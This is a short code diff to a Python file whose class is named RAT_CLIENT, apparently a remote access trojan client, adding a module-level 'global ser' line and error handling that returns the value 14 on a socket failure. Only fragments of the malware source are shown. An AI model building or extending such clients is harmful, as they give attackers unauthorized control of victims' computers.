@@ -34,6 +34,7 @@ FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
+global ser
 class RAT_CLIENT:
     def __init__(self, host, port):
         self.host = host
@@ -50,6 +51,9 @@ class RAT_CLIENT:
             s.send(sending.encode())
         except socket.error as e:
             print (e)
+            ser = 14
+            print (ser)
+            return ser
             
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
